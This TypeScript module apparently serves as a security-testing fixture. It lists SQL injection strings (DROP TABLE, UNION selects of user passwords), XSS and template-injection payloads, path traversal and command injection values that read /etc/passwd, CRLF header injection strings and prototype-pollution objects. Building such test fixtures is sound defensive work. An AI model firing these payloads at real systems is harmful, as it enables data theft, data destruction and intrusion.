/** SQL injection payloads for string parameters. */
export const SQL_INJECTIONS = [
  "' OR '1'='1",
  "'; DROP TABLE plugins;--",
  "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
  "' UNION SELECT null,null,email,password FROM users--",
  "1; WAITFOR DELAY '0:0:5'--",
  "' AND 1=1--",
  "admin'--",
  "' OR 1=1 LIMIT 1--",
  "\\x27 OR 1=1--",
];

/** XSS payloads for stored/reflected testing. */
export const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><script>alert(document.cookie)</script>',
  "javascript:alert(1)",
  '<svg onload=alert(1)>',
  '{{constructor.constructor("return this")()}}',
  "${7*7}",
  "{{7*7}}",
];

/** Path traversal payloads. */
export const PATH_TRAVERSALS = [
  "../../../etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..\\..\\..\\etc\\passwd",
  "/etc/passwd",
  "file:///etc/passwd",
];

/** Command injection payloads. */
export const CMD_INJECTIONS = [
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "$(cat /etc/passwd)",
  "`cat /etc/passwd`",
  "&& cat /etc/passwd",
  "|| cat /etc/passwd",
  "\n cat /etc/passwd",
  "; sleep 5",
];

/** Header injection payloads. */
export const HEADER_INJECTIONS = [
  "value\r\nX-Injected: true",
  "value\nSet-Cookie: evil=true",
  "value%0d%0aX-Injected:%20true",
];

/** Oversized inputs for buffer/length testing. */
export function oversizedString(len: number): string {
  return "A".repeat(len);
}

/** JSON-specific payloads for type confusion. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const TYPE_CONFUSION: any[] = [
  null,
  undefined,
  true,
  false,
  0,
  -1,
  Number.MAX_SAFE_INTEGER,
  Number.MAX_SAFE_INTEGER + 1,
  "",
  [],
  {},
  JSON.parse('{"__proto__":{"admin":true}}'),
  JSON.parse('{"constructor":{"prototype":{"admin":true}}}'),
];
